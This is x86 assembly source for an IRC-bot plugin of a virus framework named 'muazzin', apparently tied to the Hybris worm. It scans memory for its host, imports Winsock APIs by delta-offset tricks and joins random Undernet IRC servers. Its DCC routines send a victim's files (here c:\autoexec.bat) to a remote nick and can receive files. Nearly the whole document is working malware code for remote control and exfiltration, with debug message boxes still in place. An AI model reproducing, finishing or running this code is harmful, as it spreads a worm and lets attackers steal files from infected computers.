BITS 32

%include "\muazzin\muazzin.asi"
%include "\muazzin\samples\socket.inc"

%define DEBUG 1

TYPE    EQU "ircb"
VERSION EQU 0001h

RECV_BUFFER EQU 800h


main:
       jmp entry


undernet:
%include "undernet.inc"
  .end:

visit_irc:
       pushad
       call dllinit
       call delta
       mov dword [ebp+retries], 0

%ifndef DEBUG
       mov edi, [esp+8*4]
       and edi, 0fffff000h
  .search4name:
       cmp word [edi], 016ebh
       jne .dec_it
       lea eax, [edi+6]
       cmp dword [edi+11h], "HYBR"
       jne .dec_it
       cmp word [edi+15h], "IS"
       je .found
  .dec_it:
       sub edi, 01000h
       jmp short .search4name
  .found:
       lea esi, [edi+6]
       lea edi, [ebp+nosso_nome]
       call cpy_word
%endif

  .connect2server:
       call CheckInet
       jc near .offline

       sub esp, WSAdata_size
       push esp
       push dword 0101h
       call [ebp+WSAStartup]

       mov edi, esp
       push dword WSAdata_size
       push edi
       call [ebp+gethostname]
       push edi
       call [ebp+gethostbyname]
       mov eax, [eax+hostentStru.h_list]
       mov eax, [eax]
       mov eax, [eax]
       mov [ebp+nosso_ip], eax
       sub esp, -WSAdata_size
%ifdef DEBUG
       pushad
       sub esp, 100h
       mov edi, esp
       push edi
       call .tmp0
  .tmp0_:
       db "Our IP: "
  .tmp0:
       pop esi
       mov ecx, .tmp0-.tmp0_
       rep movsb
       mov ecx, 4
  .next_byte000:
       push eax
       movzx edx, al
       push edx
       call dword2decimal
       mov al, "."
       stosb
       pop eax
       ror eax, 8
       loop .next_byte000
       mov dword [edi-1], 0a0dh
       call log_msg
       sub esp, -100h
       popad
%endif

       push byte IPPROTO_IP
       push byte SOCK_STREAM
       push byte AF_INET
       call [ebp+socket]
       mov [ebp+_socket], eax
       inc eax
       jz near .closeinet

       inc dword [ebp+retries]
       push dword (undernet.end-undernet)/4
       call rnd
       sub ecx, ecx
       mov eax, [ebp+undernet+eax*4]
%ifdef DEBUG
       pushad
       sub esp, 100h
       mov edi, esp
       push edi
       call .tmp01
  .tmp0_1:
       db "Connecting to "
  .tmp01:
       pop esi
       mov ecx, .tmp01-.tmp0_1
       rep movsb
       mov ecx, 4
  .next_byte002:
       push eax
       movzx edx, al
       push edx
       call dword2decimal
       mov al, "."
       stosb
       pop eax
       ror eax, 8
       loop .next_byte002
       mov byte [edi-1], 0
       call log_msg
       sub esp, -100h
       popad
%endif

       push ecx
       push ecx
       push eax
       push byte 10
       call rnd
       ror eax, 8
       add eax, 0041a0002h              ;6660-6669
       push eax
%ifdef DEBUG
       pushad
       sub esp, 100h
       mov edx, eax
       shr edx, 16
       xchg dl, dh
       mov edi, esp
       mov al,":"
       stosb
       push edx
       call dword2decimal
       sub eax, eax
       stosd
       push esp
       call log_msg
       sub esp, -100h
       popad
%endif

       mov eax, esp
       push byte sockaddr_in_size
       push eax
       push dword [ebp+_socket]
       call [ebp+connect]
       add esp, byte sockaddr_in_size
%ifdef DEBUG
       pushad
       test eax, eax
       jz .tmp12
       call .tmp1
       db " - FAILED!",13,10,13,10,0
  .tmp1:
       jmp short .tmp11
  .tmp12:
       call .tmp11
       db " - Sucessful",13,10,0
  .tmp11:
       call log_msg
       popad
%endif
       test eax, eax
       jnz near .error

call .tmp32321
db "CONECTADO!!!",0
.tmp32321:
call msgbox

       sub esp, RECV_BUFFER
       mov dword [ebp+.nick_retries], 0

  .nickname:
       mov edi, esp
       lea esi, [ebp+nosso_nome]
       mov eax, "NICK"
       stosd
       mov al, " "
       stosb
       call cpy_word

       mov ecx, dword 0
  .nick_retries equ $-4
       jecxz .first_nick_retry
       cmp cl, 5
       ja near .freestack
       push ecx
       call dword2decimal

  .first_nick_retry:
       mov ax, 0ah
       stosw
       push esp
       call strlen
       mov edi, esp
       push eax
       push edi
       call manda
       jc .jc2freestack

       ;***mutate user
       push byte (.skip12-.skip12_)
       call .skip12
  .skip12_:
       db "USER aaaaaaaa rasta rastanet :Rasta for Real",10,0
  .skip12:
       call manda
       jc .jc2freestack

       mov edi, esp
       push edi
       call recebe
  .jc2freestack:
       jc near .freestack
       inc dword [ebp+.nick_retries]

       cmp word [edi], "43"         ;431,432,433,436
       je near .nickname

  .ircloop:
       sub ecx,ecx
       push dword [ebp+_socket]
       push byte 1
       mov eax, esp
       push ecx
       push ecx
       push ecx
       push eax
       push ecx
       call [ebp+select]
       add esp, byte 4*2
       dec eax
       jnz .freestack

       push edi
       call recebe
       jc .freestack

push edi
call msgbox

       ;***process msgs

       mov ecx, -5
       jecxz .dcc_send2ancev
       jmp short .jmp2ircloop

  .dcc_send2ancev:
call .tmp0101
db "Ready to send DCC?",0
.tmp0101:
call msgbox
       call .tmptmp
       db "haile:c:\autoexec.bat",0
  .tmptmp:
       call dccsend

  .jmp2ircloop:
       jmp short .ircloop

  .freestack:
       add esp, RECV_BUFFER
  .error:
       push dword [ebp+_socket]
       call [ebp+closesocket]
  .closeinet:
       call [ebp+WSACleanup]
  .offline:
%ifndef DEBUG
       push dword 60*1000*5
%else
       push dword 10*1000
%endif
       call [ebp+Sleep]
       cmp dword [ebp+retries], ((undernet.end-undernet)/4)*3
       jbe near .connect2server
  .exit:
       call dllfree
       popad
       jmp entry.exit


delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret


;esi=muazzin struct
dllinit:                        ;set delta, init rnd routine and import APIs
       call delta
       pushad
       mov eax, [esi+m_muazzin]
       mov [ebp+mtable], eax
       mov eax, [esi+m_iroutine]
       mov [ebp+mcall], eax
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       call [ebp+getmhnd]
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       mov ebx, eax
  .dll_in_mem:
       xchg ebx, eax                            ;ebx==module handle
       mov ecx, [esp]
       mov [ecx-4], eax                         ;-1==no unload dll
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       call [ebp+getpaddr]
       mov [esi-4], eax
       jmp short .next_import
  .dll_done:
       pop esi
       jmp short .next_dll
  .all_import:
       call [ebp+GetTickCount]
       mov [ebp+rnd.seed], eax
       popad
       ret


dllfree:
       pushad
       lea esi, [ebp+import_table]
  .next_unload:
       lodsd
       test eax, eax
       jz .all_unload
       inc eax
       jz .next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp short .next_unload
  .all_unload:
       popad
       ret


;param1->limit
rnd:
       pushad
       mov eax, 12345678h
  .seed equ $-4
       mov ecx, 41c64e6dh
       mul ecx
       add eax, 3039h
       and eax, 7ffffffh
       call delta
       mov [ebp+.seed], eax
       mov ecx, [esp+(8*4)+4]
       jecxz .nolimit
       cdq
       div ecx
       xchg eax, edx
  .nolimit:
       mov [esp+(7*4)], eax
       popad
       bt eax, 1
       ret 4


;param2->size
;param1->buffer           return->size
manda:
       pushad
       call delta
  .retry:
       push byte 0
       push dword [esp+8*4+8+1*4]
       push dword [esp+8*4+4+2*4]
       push dword [ebp+_socket]
       call [ebp+send]
       mov [esp+7*4], eax
       inc eax
       jnz .no_error
       call [ebp+WSAGetLastError]
       sub eax, WSAEWOULDBLOCK
       jz .retry
       jmp short .error
  .no_error:

%ifdef DEBUG
       pushad
       sub esp, RECV_BUFFER
       call open_eof
       mov edi, esp
       mov esi, [esp+8*4+4+8*4+RECV_BUFFER]
       mov eax, "SEND"
       stosd
       mov ax, ": "
       stosw
       mov ecx, [esp+8*4+8*4+8+RECV_BUFFER]
       rep movsb
       mov ecx, [esp+8*4+7*4+RECV_BUFFER]
       cmp ecx, byte -1
       jne .wasfine
       mov eax, " - E"
       stosd
       mov eax, "RROR"
       stosd
       mov al, "!"
       stosb
  .wasfine:
       mov ax, 0a0dh
       cmp word [edi-2], ax
       je .skipcrlf
       stosw
  .skipcrlf:
       mov esi, esp
       sub edi, esi
       mov ecx, edi
       call write_close
  .tmp2:
       sub esp, -RECV_BUFFER
       popad
%endif

       db 0a8h
  .error:
       stc
       popad
       ret 8


;param1->buffer           return->size
recebe:
       pushad
       call delta
  .retry:
       push byte 0
       push dword RECV_BUFFER
       push dword [esp+8*4+4+2*4]
       push dword 12345678h
  _socket equ $-4
       call [ebp+recv]
       mov [esp+7*4], eax
       inc eax
       jnz .no_error
       call [ebp+WSAGetLastError]
       sub eax, WSAEWOULDBLOCK
       jz .retry
       jmp .error
  .no_error:

%ifdef DEBUG
       pushad
       sub esp, RECV_BUFFER
       call open_eof
       mov edi, esp
       mov esi, [esp+8*4+4+8*4+RECV_BUFFER]
       mov eax, "RECV"
       stosd
       mov ax, ": "
       stosw
       mov ecx, [esp+8*4+7*4+RECV_BUFFER]
       and ecx, 31h
       rep movsb
       mov ax, 0a0dh
       cmp word [edi-2],ax
       je .dump
       stosw
  .dump:
       mov esi, esp
       sub edi, esi
       mov ecx, edi
       call write_close
  .tmp2:
       sub esp, -RECV_BUFFER
       popad
%endif

       mov esi, [esp+8*4+4]
       mov ebx, "PING"
       lodsd
       sub eax, ebx
       jnz .done

       sub esp, byte 7fh
       mov edi, esp
       lodsw
       sub ecx, ecx
       add bh, 06h              ;PING->PONG
       mov eax, ebx
       stosd
       mov al, " "
       stosb
       call cpy_word
       mov eax, 0a0dh
       stosd
       mov edi, esp
       push edi
       call strlen
       push eax
       push edi
       call manda
       jc .error
       add esp, byte 7fh
  .done:
       db 0a8h
  .error:
       stc
       popad
       ret 4


%ifdef DEBUG
open_eof:
       sub esi, esi
       push esi
       push dword 80h
       push byte 4                   ;open always
       push esi
       push esi
       push dword 0c0000000h
       call .tmp1
       db "irc.log",0
  .tmp1:
       call [ebp+CreateFileA]
       mov ebx, eax
       push byte 2
       push esi
       push esi
       push ebx
       call [ebp+SetFilePointer]
       ret


write_close:
       push byte 0
       mov eax, esp
       push byte 0
       push eax
       push ecx
       push esi
       push ebx
       call [ebp+WriteFile]
       mov [esp], ebx
       call [ebp+CloseHandle]
       ret


log_msg:
       pushad
       call open_eof
       mov esi, [esp+8*4+4]
       push esi
       call strlen
       mov ecx, eax
       call write_close
  .tmp2:
       popad
       ret 4


msgbox:
       pushad
       push byte 0
       call .zkip
       db "DEBUG", 0
  .zkip
       push dword [esp+8*4+3*4]
       push byte 0
       call delta
       call [ebp+MessageBoxA]
       popad
       ret 4
%endif


%include "\muazzin\samples\inet.asi"


dword2decimal:
       pushad
       mov eax, [esp+8*4+4]
       push byte 10
       pop ecx
       push byte -1
  .loop1:
       sub edx, edx
       div ecx
       push edx
       test eax, eax
       jnz .loop1
  .loop2:
       pop eax
       inc eax
       jz .done
       add al, "0"-1
       stosb
       jmp short .loop2
  .done:
       mov [esp], edi
       popad
       ret 4


string2dword:
       pushad
       mov esi, [esp+8*4+4]
       sub edx, edx
  .nxt:
       lodsb
       sub al, "0"
       jc .end
       cmp al, 9
       ja .end
       imul edx, edx, 10
       movzx eax, al
       add edx, eax
       jmp short .nxt
  .end:
       mov [esp+7*4], edx
       popad
       ret 4

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_BLOOM
       jnz near visit_irc
       test dword [esi+m_why], MT_QUERY
       jnz .query
  .exit:
       mov dword [esi+m_result], MR_DONE
       ret 4
  .query:
       mov esi, MT_QUERY+MT_BLOOM
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4


;filename
open:
       pushad
       sub eax, eax
       push eax
       push dword 80h
       push byte 4                   ;open always
       push eax
       push eax
       push dword 0c0000000h
       push dword [esp+8*4+4+6*4]
       call delta
       call [ebp+CreateFileA]
       mov [esp+7*4], eax
       popad
       ret 4


;filename:ip:port:size
dccrecv:
       pushad
       sub esp, 1000h
       call delta

       push byte IPPROTO_IP
       push byte SOCK_STREAM
       push byte AF_INET
       call [ebp+socket]
       mov [ebp+.socket], eax
       inc eax
       jz near .error

       mov esi, [esp+8*4+4]
       mov ecx, esi
       call .split_str          ;ecx=filename

       push ecx
       call open
       mov [ebp+.handle], eax
       inc eax
       jz near .endinet

       mov edi, esi             ;edi=IP
       call .split_str
       mov edx, esi             ;edx=port
       call .split_str          ;esi=size

       push edx
       call string2dword
       push eax
       call [ebp+htons]
       mov [esp+sockaddr_in.sin_port], eax

       sub eax, eax
       mov word [esp+sockaddr_in.sin_family], AF_INET
       mov [esp+sockaddr_in.sin_zero], eax
       mov [esp+sockaddr_in.sin_zero+4], eax

       xchg esi, edi
       push edi
       call string2dword
       mov edi, eax             ;edi=size

       sub ebx, ebx
       push byte 4
       pop ecx
  .next_octet:                  ;esi=IP
       push esi
       call string2dword
  .next_dot:
       lodsb
       sub al, "."
       jnz .next_dot
       mov bl, al
       shl ebx, 8
       loop .next_octet
       mov [esp+sockaddr_in.sin_addr], ebx

       mov eax, esp
       push byte sockaddr_in_size
       push eax
       push dword [ebp+.socket]
       call [ebp+connect]
       test eax, eax
       jnz .closefile

       sub ebx, ebx
       mov esi, esp
  .recv_loop:
       push byte 0
       push dword 1000h
       push esi
       push dword [ebp+.socket]
       call [ebp+recv]
       inc eax
       jz .closefile
       dec eax

       sub edi, eax
       add ebx, eax

       push byte 0
       push esp
       push eax
       push esi
       push dword [ebp+.handle]
       call [ebp+WriteFile]
       bswap ebx
       mov [esp], ebx
       bswap ebx
       mov eax, esp
       push byte 0
       push byte 4
       push eax
       push dword [ebp+.socket]
       call [ebp+send]
       pop eax

       test edi, edi
       jnz .recv_loop

  .closefile:
       push dword 12345678h
  .handle equ $-4
       call [ebp+CloseHandle]
  .endinet:
       push dword 12345678h
  .socket equ $-4
       call [ebp+closesocket]
  .error:
       add esp, 1000h
       popad
       ret 4

  .split_str:
       push eax
  .split_str1:
       lodsb
       sub al, ":"
       jnz .split_str1
       mov [esi-1], al
       pop eax
       ret

;nick:filename
dccsend:
       pushad
       sub esp, 1000h
       sub esi, esi

       push byte IPPROTO_IP
       push byte SOCK_STREAM
       push byte AF_INET
       call [ebp+socket]
       mov [ebp+.socket], eax
       inc eax
       jz near .error

       mov dword [esp+sockaddr_in.sin_family], AF_INET
       mov [esp+sockaddr_in.sin_zero], esi
       mov [esp+sockaddr_in.sin_zero+4], esi
       mov [esp+sockaddr_in.sin_addr], esi

       push dword 5000
       call rnd
       add eax, 50200
       push eax
       push eax
       call [ebp+htons]
       mov [edx+sockaddr_in.sin_port], eax

       mov eax, esp
       push byte sockaddr_in_size
       push eax
       push dword [ebp+.socket]
       call [ebp+bind]
       test eax, eax
       pop edx                            ;edx=port
       jnz near .error

       mov edi, esp
       mov esi, [esp+8*4+4+1000h]
       mov eax, "PRIV"
       stosd
       mov eax, "MSG "
       stosd
  .nickname:
       lodsb
       cmp al, ":"
       jz .nick
       stosb
       jmp short .nickname
  .nick:
       mov ax, " :"
       stosw
       mov eax, 043434401h
       stosd
       mov eax, " SEN"
       stosd
       mov ax, "D "
       stosw
       call cpy_word
       mov byte [edi-1], " "
       push dword [ebp+nosso_ip]
       call dword2decimal
       mov al, " "
       stosb
       push edx
       call dword2decimal
       mov al, " "
       stosb

       push esi
       call open
       mov [ebp+.handle], eax
       inc eax
       jz near .error

       sub esi, esi
       push esi
       push dword [ebp+.handle]
       call [ebp+GetFileSize]

       push eax
       call dword2decimal
       push byte 1
       pop eax
       stosw

       push esp
       call strlen
       push esp
       xchg eax, [esp]
       push eax
       call manda
       jc near .error2

       push byte 2
       push dword [ebp+.socket]
       call [ebp+listen]

       push dword [ebp+.socket]
       push byte 1
       mov eax, esp

       push esi
       push byte 60

       push esp
       push esi
       push esi
       push eax
       push esp
       call [ebp+select]
       add esp, 4*2+4*2
       test eax, eax
       jz .error2

       push esi
       push esi
       push dword [ebp+.socket]
       call [ebp+accept]

       xchg eax, [ebp+.socket]
       push eax
       call [ebp+CloseHandle]

       mov edi, esp
       mov ebx, 1000h
  .sendloop:
       push esi

       push esi
       mov eax, esp

       push esi
       push eax
       push ebx
       push edi
       push dword [ebp+.handle]
       call [ebp+ReadFile]

       push edi
       push dword [ebp+.socket]
       call [ebp+send]

       ;***recv ACK

       xor eax, ebx
       jz .sendloop

       push dword 5*1000
       call [ebp+Sleep]

  .error2:
       push dword 0
  .handle equ $-4
       call [ebp+CloseHandle]

  .error:
       push dword 0
  .socket equ $-4
       call [ebp+CloseHandle]
       add esp, 1000h
       popad
       ret 4


strlen:
       push esi
       push ecx
       mov esi, [esp+2*4+4]
       sub ecx, ecx
  .next:
       lodsb
       test al, al
       jz .done
       inc ecx
       jmp short .next
  .done:
       mov eax, ecx
       pop ecx
       pop esi
       ret 4

cpy_word:
       push eax
       push esi
  .nxt:
       lodsb
       test al, al
       jz .done
       cmp al, " "
       jz .done
       cmp al, 0ah
       jz .nxt
       cmp al, 0dh
       jz .done
       stosb
       jmp short .nxt
  .done:
       pop esi
       pop eax
       ret


import_table dd kernel32
             dd wsock32
%ifdef DEBUG
             dd user32
%endif
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
.api011     dd .apiname011
%ifdef DEBUG
.api012     dd .apiname012
%endif
.api013     dd .apiname013
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileA", 0
.apiname004 db "CloseHandle", 0
.apiname005 db "ReadFile", 0
.apiname006 db "GlobalAlloc", 0
.apiname007 db "GlobalFree", 0
.apiname008 db "Sleep",0
.apiname009 db "GetSystemTime",0
.apiname010 db "GetTickCount",0
.apiname011 db "WriteFile",0
%ifdef DEBUG
.apiname012 db "SetFilePointer",0
%endif
.apiname013 db "GetFileSize",0

wsock32     db "WS2_32.DLL",0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
.api011     dd .apiname011
.api012     dd .apiname012
.api013     dd .apiname013
.api014     dd .apiname014
.api015     dd .apiname015
            dd 0
.apiname001 db "connect", 0
.apiname002 db "closesocket", 0
.apiname003 db "recv", 0
.apiname004 db "send", 0
.apiname005 db "WSAGetLastError", 0
.apiname006 db "WSAStartup", 0
.apiname007 db "WSACleanup", 0
.apiname008 db "socket", 0
.apiname009 db "htons", 0
.apiname010 db "bind", 0
.apiname011 db "listen", 0
.apiname012 db "accept", 0
.apiname013 db "select", 0
.apiname014 db "gethostname", 0
.apiname015 db "gethostbyname", 0

%ifdef DEBUG
user32      db "USER32.DLL",0
.api001     dd .apiname001
            dd 0
.apiname001 db "MessageBoxA", 0

MessageBoxA equ user32.api001
SetFilePointer equ kernel32.api012
%endif

LoadLibraryA     equ kernel32.api001
FreeLibrary      equ kernel32.api002
CreateFileA      equ kernel32.api003
CloseHandle      equ kernel32.api004
ReadFile         equ kernel32.api005
GlobalAlloc      equ kernel32.api006
GlobalFree       equ kernel32.api007
Sleep            equ kernel32.api008
GetSystemTime    equ kernel32.api009
GetTickCount     equ kernel32.api010
WriteFile        equ kernel32.api011
GetFileSize      equ kernel32.api013

connect          equ wsock32.api001
closesocket      equ wsock32.api002
recv             equ wsock32.api003
send             equ wsock32.api004
WSAGetLastError  equ wsock32.api005
WSAStartup       equ wsock32.api006
WSACleanup       equ wsock32.api007
socket           equ wsock32.api008
htons            equ wsock32.api009
bind             equ wsock32.api010
listen           equ wsock32.api011
accept           equ wsock32.api012
select           equ wsock32.api013
gethostname      equ wsock32.api014
gethostbyname    equ wsock32.api015

LOADLIB equ LoadLibraryA
FREELIB equ FreeLibrary

mtable   dd 0
mcall    dd 0
getpaddr dd 0
getmhnd  dd 0
retries  dd 0
nosso_ip dd 0

nosso_nome db "AAAAAAAA",0

